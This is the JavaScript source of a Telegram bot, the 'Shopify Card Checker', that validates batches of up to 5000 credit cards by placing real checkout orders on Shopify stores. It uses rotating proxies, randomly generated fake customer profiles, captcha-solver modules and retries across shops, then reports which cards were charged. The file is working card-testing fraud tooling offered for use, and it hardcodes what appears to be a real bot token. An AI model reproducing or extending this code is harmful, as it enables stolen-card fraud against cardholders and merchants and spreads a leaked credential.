#!/usr/bin/env node

/**
 * Shopify Mass Checker Telegram Bot
 * Uses ALL existing modules: site.js, browserCaptchaSolver.js, addresses.js, 
 * phoneGenerator.js, userAgent.js, hCaptchaSolver.js, queries.js
 */

import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { promises as fsPromises } from 'fs';

// Get current directory
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Import ALL your modules
import ShopifyCheckout from './site.js';
import BrowserCaptchaSolver from './browserCaptchaSolver.js';
import { getRandomAddress, getAddressByCountry, addressesByCountry } from './addresses.js';
import { generatePhone } from './phoneGenerator.js';
import UserAgent from './userAgent.js';
import HCaptchaSolver from './hCaptchaSolver.js';
import queries from './queries.js';

// ══════════════════════════════════════════════════════════════════════════════
//                              📱 TELEGRAM CONFIG
// ══════════════════════════════════════════════════════════════════════════════

// Replace with your bot token from @BotFather
const BOT_TOKEN = '7897881067:AAEk1CL1e0qW_kQ9LSDu1gDL_rlXy5FKKiI';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ══════════════════════════════════════════════════════════════════════════════
//                              📊 DATABASE & STORAGE
// ══════════════════════════════════════════════════════════════════════════════

const dataDir = path.join(__dirname, 'data');
const usersDir = path.join(dataDir, 'users');
const shopsFile = path.join(dataDir, 'shops.txt');

// Ensure directories exist
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
if (!fs.existsSync(usersDir)) fs.mkdirSync(usersDir, { recursive: true });
if (!fs.existsSync(shopsFile)) fs.writeFileSync(shopsFile, '');

// User data structure
class UserData {
    constructor(userId) {
        this.userId = userId;
        this.userFile = path.join(usersDir, `${userId}.json`);
        this.proxyFile = path.join(usersDir, `${userId}_proxies.txt`);
        this.load();
    }

    load() {
        try {
            if (fs.existsSync(this.userFile)) {
                const data = JSON.parse(fs.readFileSync(this.userFile, 'utf8'));
                Object.assign(this, data);
            } else {
                this.role = 'user';
                this.allowed = true;
                this.stats = {
                    totalChecks: 0,
                    charged: 0,
                    '3ds': 0,
                    declined: 0,
                    error: 0,
                    lastCheck: null
                };
                this.history = [];
                this.proxies = [];
                this.concurrentChecks = 5;
                this.save();
            }
            
            // Load proxies from file
            if (fs.existsSync(this.proxyFile)) {
                const proxyData = fs.readFileSync(this.proxyFile, 'utf8');
                this.proxies = proxyData.split('\n').filter(p => p.trim());
            }
        } catch (e) {
            console.error('Error loading user data:', e);
            this.reset();
        }
    }

    save() {
        try {
            const saveData = {
                role: this.role,
                allowed: this.allowed,
                stats: this.stats,
                history: this.history.slice(-50), // Keep last 50
                concurrentChecks: this.concurrentChecks
            };
            fs.writeFileSync(this.userFile, JSON.stringify(saveData, null, 2), 'utf8');
            
            // Save proxies to file
            fs.writeFileSync(this.proxyFile, this.proxies.join('\n'), 'utf8');
        } catch (e) {
            console.error('Error saving user data:', e);
        }
    }

    reset() {
        this.role = 'user';
        this.allowed = true;
        this.stats = { totalChecks: 0, charged: 0, '3ds': 0, declined: 0, error: 0, lastCheck: null };
        this.history = [];
        this.proxies = [];
        this.concurrentChecks = 5;
        this.save();
    }

    addCheck(result) {
        this.stats.totalChecks++;
        this.stats.lastCheck = new Date().toISOString();
        
        if (result.status === 'CHARGED') this.stats.charged++;
        else if (result.status === '3DS') this.stats['3ds']++;
        else if (result.status === 'DECLINED') this.stats.declined++;
        else this.stats.error++;
        
        this.history.push({
            timestamp: new Date().toISOString(),
            card: result.card ? result.card.substring(0, 8) + '***' : 'N/A',
            status: result.status,
            message: result.message,
            shop: result.shop || 'N/A',
            amount: result.amount || 'N/A'
        });
        
        if (this.history.length > 50) this.history.shift();
        this.save();
    }

    addProxies(proxies) {
        const newProxies = proxies.split('\n').map(p => p.trim()).filter(p => p && !this.proxies.includes(p));
        this.proxies.push(...newProxies);
        this.save();
        return newProxies.length;
    }

    clearProxies() {
        const count = this.proxies.length;
        this.proxies = [];
        this.save();
        return count;
    }

    reloadProxies() {
        if (fs.existsSync(this.proxyFile)) {
            const proxyData = fs.readFileSync(this.proxyFile, 'utf8');
            this.proxies = proxyData.split('\n').filter(p => p.trim());
        }
        return this.proxies.length;
    }

    getRandomProxy() {
        if (this.proxies.length === 0) return null;
        return this.proxies[Math.floor(Math.random() * this.proxies.length)];
    }
}

// Load shops
function loadShops() {
    try {
        const data = fs.readFileSync(shopsFile, 'utf8');
        const lines = data.split('\n');
        const shops = new Set();
        
        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed || trimmed.startsWith('#')) continue;
            
            let domain = null;
            const firstPart = trimmed.split(/\s*\|\s*|\t+|\s\s+/)[0].trim();
            
            if (firstPart.startsWith('http://') || firstPart.startsWith('https://')) {
                const temp = firstPart.replace(/^https?:\/\//, '');
                const match = temp.match(/^([a-zA-Z0-9][-a-zA-Z0-9.]*[a-zA-Z0-9])(?::\d+)?(?:\/|:|$)/);
                domain = match ? match[1] : temp.split('/')[0].split(':')[0];
            } else {
                domain = firstPart.split(':')[0].trim();
            }
            
            if (domain) {
                domain = domain.toLowerCase().trim();
                if (domain.startsWith('www.')) domain = domain.substring(4);
                domain = domain.replace(/\.+$/, '');
                
                if (domain.includes('.') && domain.length >= 4 && /^[a-z0-9][-a-z0-9.]*[a-z0-9]$/.test(domain)) {
                    shops.add(`https://${domain}`);
                }
            }
        }
        
        return Array.from(shops);
    } catch (error) {
        return [];
    }
}

// BIN database
const BIN_DB = {
    '4': { brand: 'VISA', type: 'CREDIT', level: 'CLASSIC' },
    '51': { brand: 'MASTERCARD', type: 'CREDIT', level: 'STANDARD' },
    '52': { brand: 'MASTERCARD', type: 'CREDIT', level: 'STANDARD' },
    '53': { brand: 'MASTERCARD', type: 'CREDIT', level: 'STANDARD' },
    '54': { brand: 'MASTERCARD', type: 'CREDIT', level: 'STANDARD' },
    '55': { brand: 'MASTERCARD', type: 'CREDIT', level: 'GOLD' },
    '34': { brand: 'AMEX', type: 'CREDIT', level: 'GOLD' },
    '37': { brand: 'AMEX', type: 'CREDIT', level: 'PLATINUM' },
    '65': { brand: 'DISCOVER', type: 'CREDIT', level: 'STANDARD' },
    '60': { brand: 'DISCOVER', type: 'CREDIT', level: 'STANDARD' },
    '35': { brand: 'JCB', type: 'CREDIT', level: 'STANDARD' },
    '30': { brand: 'DINERS', type: 'CREDIT', level: 'STANDARD' },
    '36': { brand: 'DINERS', type: 'CREDIT', level: 'STANDARD' }
};

function getBINInfo(cardNumber) {
    const firstTwo = cardNumber.substring(0, 2);
    const firstOne = cardNumber.substring(0, 1);
    
    let binInfo = BIN_DB[firstTwo] || BIN_DB[firstOne] || { 
        brand: 'UNKNOWN', 
        type: 'UNKNOWN', 
        level: 'UNKNOWN' 
    };
    
    // Add country based on first digits
    if (cardNumber.startsWith('4')) binInfo.country = '🇺🇸 USA';
    else if (cardNumber.startsWith('5')) binInfo.country = '🇺🇸 USA';
    else if (cardNumber.startsWith('3')) binInfo.country = '🇺🇸 USA';
    else if (cardNumber.startsWith('6')) binInfo.country = '🇺🇸 USA';
    else binInfo.country = '🌍 UNKNOWN';
    
    return binInfo;
}

// Global stats
let globalStats = {
    totalChecks: 0,
    charged: 0,
    '3ds': 0,
    declined: 0,
    error: 0,
    shops: 0,
    activeUsers: 0
};

// Active check sessions
const activeChecks = new Map();

// Parse card
function parseCard(cardString) {
    const parts = cardString.split('|');
    if (parts.length < 4) return null;
    
    return {
        number: parts[0].replace(/\s/g, ''),
        month: parts[1].padStart(2, '0'),
        year: parts[2],
        cvv: parts[3],
        name: 'John Smith'
    };
}

// Check if card expired
function isCardExpired(cardString) {
    try {
        const parts = cardString.split('|');
        if (parts.length < 4) return true;
        
        const mm = parseInt(parts[1]);
        let yy = parts[2];
        
        let year;
        if (yy.length === 2) {
            year = 2000 + parseInt(yy);
        } else {
            year = parseInt(yy);
        }
        
        const now = new Date();
        const currentYear = now.getFullYear();
        const currentMonth = now.getMonth() + 1;
        
        if (year < currentYear) return true;
        if (year === currentYear && mm < currentMonth) return true;
        
        return false;
    } catch (error) {
        return true;
    }
}

// Create profile
function getRandomProfile() {
    const firstNames = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles'];
    const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
    
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const randomStr = Math.random().toString(36).substring(2, 10);
    const email = `${randomStr}@mailsiutoc.com`;
    
    const address = getAddressByCountry('US');
    const phone = generatePhone('international');
    
    return {
        firstName,
        lastName,
        email,
        ...address,
        phone
    };
}

// Check card on shop
async function checkCardOnShop(card, shopUrl, proxy = null, userData) {
    const shopDomain = new URL(shopUrl).hostname;
    
    try {
        const cardObj = parseCard(card);
        if (!cardObj) {
            return { status: 'ERROR', message: 'Invalid card format', shop: shopDomain, card: card };
        }
        
        const profile = getRandomProfile();
        
        const options = {
            domain: shopDomain,
            card: cardObj,
            profile: profile,
            proxy: proxy,
            telegramToken: BOT_TOKEN,
            telegramChatId: null
        };
        
        const checker = new ShopifyCheckout(options);
        const result = await checker.run();
        
        if (result.success) {
            if (result.status === 'Charged') {
                return {
                    status: 'CHARGED',
                    message: result.message || 'Order Confirmed',
                    shop: shopDomain,
                    amount: result.total || 'N/A',
                    orderId: result.orderId || '',
                    email: profile.email,
                    gateway: result.gateway || 'Unknown',
                    card: card
                };
            } else if (result.status === '3DS') {
                return {
                    status: '3DS',
                    message: result.message || '3D Secure Required',
                    shop: shopDomain,
                    amount: result.total || 'N/A',
                    card: card
                };
            } else if (result.status === 'Declined' || result.status === 'Live') {
                return {
                    status: 'DECLINED',
                    message: result.message || 'Card Declined',
                    shop: shopDomain,
                    amount: result.total || 'N/A',
                    card: card
                };
            }
        }
        
        return {
            status: 'ERROR',
            message: result.message || 'Unknown error',
            shop: shopDomain,
            card: card
        };
        
    } catch (error) {
        return {
            status: 'ERROR',
            message: error.message || 'Exception occurred',
            shop: shopDomain,
            card: card
        };
    }
}

// Check card with retry
async function checkCardWithRetry(card, shops, userData) {
    const triedShops = new Set();
    const availableShops = [...shops];
    const maxRetries = 3;
    
    for (let attempt = 0; attempt < maxRetries; attempt++) {
        if (triedShops.size >= availableShops.length) triedShops.clear();
        
        const untriedShops = availableShops.filter(shop => !triedShops.has(shop));
        if (untriedShops.length === 0) break;
        
        const shopUrl = untriedShops[Math.floor(Math.random() * untriedShops.length)];
        triedShops.add(shopUrl);
        
        const proxy = userData.proxies.length > 0 ? userData.getRandomProxy() : null;
        const result = await checkCardOnShop(card, shopUrl, proxy, userData);
        
        if (result.status !== 'ERROR' || 
            !result.message.toLowerCase().includes('captcha') &&
            !result.message.toLowerCase().includes('no products') &&
            !result.message.toLowerCase().includes('timeout')) {
            return result;
        }
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    return {
        status: 'ERROR',
        message: 'All shops failed after retries',
        shop: 'N/A',
        card: card
    };
}

// Format results
function formatChargedResult(result) {
    const binInfo = getBINInfo(result.card.split('|')[0]);
    
    return `✅ CHARGED!
━━━━━━━━━━━━━━━━━━━━━━
💳 ${result.card}
🏪 ${result.shop}
💰 ${result.amount} USD
📧 ${result.email}

🏦 BIN Info:
   • Brand: ${binInfo.brand}
   • Type: ${binInfo.type} | Level: ${binInfo.level}
   • Country: ${binInfo.country}
━━━━━━━━━━━━━━━━━━━━━━`;
}

function formatCheckResult(result) {
    const icons = {
        'CHARGED': '✅',
        '3DS': '🔐',
        'DECLINED': '❌',
        'ERROR': '⚠️'
    };
    
    return `${icons[result.status] || '📝'} ${result.status} → ${result.card.substring(0, 8)}*** → ${result.message}`;
}

// Progress bar
function createProgressBar(percentage, width = 20) {
    const filled = Math.round(width * (percentage / 100));
    const empty = width - filled;
    return '█'.repeat(filled) + '░'.repeat(empty);
}

// Format time
function formatTime(seconds) {
    const hrs = Math.floor(seconds / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = Math.floor(seconds % 60);
    return `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

// Send progress update
async function sendProgressUpdate(chatId, messageId, stats, total, current, startTime, userData) {
    const percentage = (current / total) * 100;
    const elapsed = (Date.now() - startTime) / 1000;
    const speed = current / (elapsed / 60);
    const eta = total > current ? ((total - current) / speed) * 60 : 0;
    
    const progressBar = createProgressBar(percentage);
    const message = `⏳ CHECKING...
━━━━━━━━━━━━━━━━━━━━━━

[${progressBar}] ${percentage.toFixed(1)}%
📊 ${current} / ${total} (${percentage.toFixed(1)}%)

⚡ Speed: ${speed.toFixed(1)}/min
⏱️ Time: ${formatTime(elapsed)} | ETA: ${formatTime(eta)}
🔌 Proxies: ${userData.proxies.length} | Concurrent: ${userData.concurrentChecks}

┌─────────────────────┐
│ ✅ CHG:    ${stats.charged.toString().padStart(4)}  🔐 3DS:    ${stats['3ds'].toString().padStart(4)} │
│ ❌ DCL:    ${stats.declined.toString().padStart(4)}  ⚠️ ERR:    ${stats.error.toString().padStart(4)} │
└─────────────────────┘`;
    
    try {
        if (messageId) {
            await bot.editMessageText(message, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown'
            });
        } else {
            const sent = await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            return sent.message_id;
        }
    } catch (e) {
        console.error('Error updating progress:', e);
    }
    
    return messageId;
}

// Process file check
async function processFileCheck(chatId, userData, cards, messageId) {
    const sessionId = `${chatId}_${Date.now()}`;
    const shops = loadShops();
    const totalCards = cards.length;
    
    if (shops.length === 0) {
        await bot.sendMessage(chatId, '❌ No shops available! Add shops to shops.txt file.');
        return;
    }
    
    if (totalCards > 5000) {
        await bot.sendMessage(chatId, '❌ Maximum 5000 cards per file!');
        return;
    }
    
    const sessionStats = {
        charged: 0,
        '3ds': 0,
        declined: 0,
        error: 0,
        completed: 0
    };
    
    const startTime = Date.now();
    activeChecks.set(sessionId, { running: true, chatId });
    
    // Initial progress message
    let progressMessageId = messageId;
    
    // Process cards in batches
    const batchSize = Math.min(userData.concurrentChecks, 10);
    
    for (let i = 0; i < totalCards; i += batchSize) {
        if (!activeChecks.get(sessionId)?.running) break;
        
        const batch = cards.slice(i, i + batchSize);
        const batchPromises = batch.map(card => checkCardWithRetry(card, shops, userData));
        
        const results = await Promise.all(batchPromises);
        
        for (const result of results) {
            sessionStats.completed++;
            
            // Update stats
            if (result.status === 'CHARGED') sessionStats.charged++;
            else if (result.status === '3DS') sessionStats['3ds']++;
            else if (result.status === 'DECLINED') sessionStats.declined++;
            else sessionStats.error++;
            
            // Update user stats
            userData.addCheck(result);
            
            // Update global stats
            globalStats.totalChecks++;
            if (result.status === 'CHARGED') globalStats.charged++;
            else if (result.status === '3DS') globalStats['3ds']++;
            else if (result.status === 'DECLINED') globalStats.declined++;
            else globalStats.error++;
            
            // Send charged results immediately
            if (result.status === 'CHARGED') {
                await bot.sendMessage(chatId, formatChargedResult(result), { parse_mode: 'Markdown' });
            }
        }
        
        // Update progress every 10 cards or every 5 seconds
        if (sessionStats.completed % 10 === 0 || Date.now() - startTime > 5000) {
            progressMessageId = await sendProgressUpdate(
                chatId, 
                progressMessageId, 
                sessionStats, 
                totalCards, 
                sessionStats.completed, 
                startTime, 
                userData
            );
        }
        
        // Small delay between batches
        await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    // Final update
    await sendProgressUpdate(
        chatId, 
        progressMessageId, 
        sessionStats, 
        totalCards, 
        totalCards, 
        startTime, 
        userData
    );
    
    // Final summary
    const finalMessage = `✅ CHECK COMPLETE!
━━━━━━━━━━━━━━━━━━━━━━
📊 Results:
✅ Charged: ${sessionStats.charged}
🔐 3DS: ${sessionStats['3ds']}
❌ Declined: ${sessionStats.declined}
⚠️ Error: ${sessionStats.error}

⏱️ Total time: ${formatTime((Date.now() - startTime) / 1000)}`;
    
    await bot.sendMessage(chatId, finalMessage, { parse_mode: 'Markdown' });
    
    activeChecks.delete(sessionId);
}

// ══════════════════════════════════════════════════════════════════════════════
//                              🤖 TELEGRAM BOT HANDLERS
// ══════════════════════════════════════════════════════════════════════════════

// /start command
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userData = new UserData(userId);
    
    const message = `🛒 SHOPIFY CARD CHECKER BOT 🛒
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Hello ${msg.from.first_name || 'User'}! 👋

👤 Your Info:
• User ID: ${userId}
• Role: ${userData.role === 'admin' ? '👑 Admin' : '✅ User'}
• ${userData.allowed ? '✅ Allowed' : '❌ Blocked'}
• ${userData.proxies.length > 0 ? '✅ Custom proxies' : '🌐 No proxies'}

This bot helps you check credit cards via Shopify.

📋 How to use:
• /sh cc|mm|yyyy|cvv - Check 1 card
• Send .txt file - Check multiple cards

📝 Card format:
cc|mm|yyyy|cvv or cc|mm|yy|cvv

🔧 Commands:
/sh card - Quick check 1 card
/fsh - Reply to file then type /fsh to check
/mystats - View your stats 📊
/history - View last 10 checks 📜
/myproxy - Manage your proxies 🔌
/status - Bot status
/stats - Total statistics
/stop - Stop running check

📊 Info:
• Shops: ${loadShops().length}
• Proxies: ${userData.proxies.length}
• Max cards/file: 5000`;
    
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// /sh command - single card check
bot.onText(/\/sh (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userData = new UserData(userId);
    
    if (!userData.allowed) {
        await bot.sendMessage(chatId, '❌ You are not allowed to use this bot!');
        return;
    }
    
    const cardString = match[1].trim();
    
    if (isCardExpired(cardString)) {
        await bot.sendMessage(chatId, '❌ Card is expired!');
        return;
    }
    
    const shops = loadShops();
    if (shops.length === 0) {
        await bot.sendMessage(chatId, '❌ No shops available!');
        return;
    }
    
    const checkingMsg = await bot.sendMessage(chatId, '⏳ Checking card...', { parse_mode: 'Markdown' });
    
    try {
        const result = await checkCardWithRetry(cardString, shops, userData);
        
        // Update stats
        userData.addCheck(result);
        globalStats.totalChecks++;
        if (result.status === 'CHARGED') globalStats.charged++;
        else if (result.status === '3DS') globalStats['3ds']++;
        else if (result.status === 'DECLINED') globalStats.declined++;
        else globalStats.error++;
        
        // Send result
        if (result.status === 'CHARGED') {
            await bot.editMessageText(formatChargedResult(result), {
                chat_id: chatId,
                message_id: checkingMsg.message_id,
                parse_mode: 'Markdown'
            });
        } else {
            await bot.editMessageText(formatCheckResult(result), {
                chat_id: chatId,
                message_id: checkingMsg.message_id,
                parse_mode: 'Markdown'
            });
        }
    } catch (error) {
        await bot.editMessageText(`❌ Error: ${error.message}`, {
            chat_id: chatId,
            message_id: checkingMsg.message_id
        });
    }
});

// File handler
const fileHandlers = new Map();

bot.on('document', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userData = new UserData(userId);
    
    if (!userData.allowed) {
        await bot.sendMessage(chatId, '❌ You are not allowed to use this bot!');
        return;
    }
    
    if (msg.document.mime_type === 'text/plain' || msg.document.file_name.endsWith('.txt')) {
        fileHandlers.set(chatId, {
            fileId: msg.document.file_id,
            fileName: msg.document.file_name,
            timestamp: Date.now()
        });
        
        await bot.sendMessage(chatId, '📄 File received! Type /fsh to start checking.', { parse_mode: 'Markdown' });
    }
});

// /fsh command - process file
bot.onText(/\/fsh/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userData = new UserData(userId);
    
    if (!userData.allowed) {
        await bot.sendMessage(chatId, '❌ You are not allowed to use this bot!');
        return;
    }
    
    const fileHandler = fileHandlers.get(chatId);
    if (!fileHandler || Date.now() - fileHandler.timestamp > 300000) { // 5 minutes
        await bot.sendMessage(chatId, '❌ No recent file found! Send a .txt file first.');
        return;
    }
    
    try {
        const fileLink = await bot.getFileLink(fileHandler.fileId);
        const response = await fetch(fileLink);
        const fileContent = await response.text();
        
        const cards = fileContent.split('\n')
            .map(line => line.trim())
            .filter(line => line.includes('|') && line.split('|').length >= 4)
            .filter(card => !isCardExpired(card));
        
        if (cards.length === 0) {
            await bot.sendMessage(chatId, '❌ No valid cards found in file!');
            return;
        }
        
        const startMsg = await bot.sendMessage(chatId, `📊 Found ${cards.length} valid cards. Starting check...`, { parse_mode: 'Markdown' });
        
        // Process file
        await processFileCheck(chatId, userData, cards, startMsg.message_id);
        
        fileHandlers.delete(chatId);
    } catch (error) {
        await bot.sendMessage(chatId, `❌ Error processing file: ${error.message}`);
    }
});

// /myproxy command
bot.onText(/\/myproxy/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userData = new UserData(userId);
    
    const message = `🔌 Your Proxies
━━━━━━━━━━━━━━━━━━━━━━
• Proxies: ${userData.proxies.length} ${userData.proxies.length > 0 ? '(custom)' : '(none)'}
• Concurrent: ${userData.concurrentChecks} (auto)

Commands:
/myproxyadd <proxy> - Add single proxy
/myproxyadd (multiline) - Add multiple proxies
/myproxy reload - Reload from database
/myproxy clear - Delete all

Example:
/myproxyadd dc.decodo.com:10000:user:pass`;
    
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// /myproxyadd command
bot.onText(/\/myproxyadd (.+)/s, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userData = new UserData(userId);
    
    const proxiesText = match[1].trim();
    const added = userData.addProxies(proxiesText);
    
    await bot.sendMessage(chatId, `✅ Added ${added} proxies. Total: ${userData.proxies.length}`, { parse_mode: 'Markdown' });
});

// /myproxy reload
bot.onText(/\/myproxy reload/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userData = new UserData(userId);
    
    const count = userData.reloadProxies();
    await bot.sendMessage(chatId, `✅ Reloaded ${count} proxies from database.`, { parse_mode: 'Markdown' });
});

// /myproxy clear
bot.onText(/\/myproxy clear/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userData = new UserData(userId);
    
    const count = userData.clearProxies();
    await bot.sendMessage(chatId, `✅ Cleared ${count} proxies.`, { parse_mode: 'Markdown' });
});

// /mystats command
bot.onText(/\/mystats/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userData = new UserData(userId);
    
    const message = `📊 Your Statistics
━━━━━━━━━━━━━━━━━━━━━━
• Total Checks: ${userData.stats.totalChecks}
• ✅ Charged: ${userData.stats.charged}
• 🔐 3DS: ${userData.stats['3ds']}
• ❌ Declined: ${userData.stats.declined}
• ⚠️ Error: ${userData.stats.error}

• Proxies: ${userData.proxies.length}
• Last Check: ${userData.stats.lastCheck ? new Date(userData.stats.lastCheck).toLocaleString() : 'Never'}`;
    
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// /history command
bot.onText(/\/history/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const userData = new UserData(userId);
    
    if (userData.history.length === 0) {
        await bot.sendMessage(chatId, '📜 No history found.');
        return;
    }
    
    let message = '📜 Last 10 Checks\n━━━━━━━━━━━━━━━━━━━━━━\n\n';
    const recentHistory = userData.history.slice(-10).reverse();
    
    for (const check of recentHistory) {
        const icon = check.status === 'CHARGED' ? '✅' : 
                     check.status === '3DS' ? '🔐' : 
                     check.status === 'DECLINED' ? '❌' : '⚠️';
        const time = new Date(check.timestamp).toLocaleTimeString();
        message += `${icon} ${time} - ${check.card} - ${check.status}\n`;
        message += `   Shop: ${check.shop} | Amount: ${check.amount}\n\n`;
    }
    
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// /status command
bot.onText(/\/status/, async (msg) => {
    const chatId = msg.chat.id;
    const shops = loadShops();
    
    // Count active users
    const userFiles = fs.readdirSync(usersDir).filter(f => f.endsWith('.json'));
    globalStats.activeUsers = userFiles.length;
    globalStats.shops = shops.length;
    
    const message = `🤖 Bot Status
━━━━━━━━━━━━━━━━━━━━━━
• Uptime: ${formatTime(process.uptime())}
• Active Checks: ${Array.from(activeChecks.values()).filter(s => s.running).length}
• Total Users: ${userFiles.length}
• Available Shops: ${shops.length}
• Active Proxies: ${Array.from(new Set(userFiles.flatMap(f => {
    const proxyFile = path.join(usersDir, f.replace('.json', '_proxies.txt'));
    return fs.existsSync(proxyFile) ? fs.readFileSync(proxyFile, 'utf8').split('\n').filter(p => p) : [];
}))).length}`;
    
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// /stats command
bot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    
    const message = `📊 Global Statistics
━━━━━━━━━━━━━━━━━━━━━━
• Total Checks: ${globalStats.totalChecks}
• ✅ Charged: ${globalStats.charged}
• 🔐 3DS: ${globalStats['3ds']}
• ❌ Declined: ${globalStats.declined}
• ⚠️ Error: ${globalStats.error}

• Success Rate: ${globalStats.totalChecks > 0 ? ((globalStats.charged / globalStats.totalChecks) * 100).toFixed(2) : 0}%
• Active Users: ${globalStats.activeUsers}
• Available Shops: ${globalStats.shops}`;
    
    await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// /stop command
bot.onText(/\/stop/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    // Find and stop user's active sessions
    let stopped = 0;
    for (const [sessionId, session] of activeChecks.entries()) {
        if (session.chatId === chatId && session.running) {
            session.running = false;
            stopped++;
        }
    }
    
    if (stopped > 0) {
        await bot.sendMessage(chatId, `🛑 Stopped ${stopped} running check(s).`);
    } else {
        await bot.sendMessage(chatId, 'ℹ️ No active checks to stop.');
    }
});

// Error handling
bot.on('polling_error', (error) => {
    console.error('Polling error:', error);
});

bot.on('error', (error) => {
    console.error('Bot error:', error);
});

console.log('🤖 Shopify Card Checker Bot is running...');
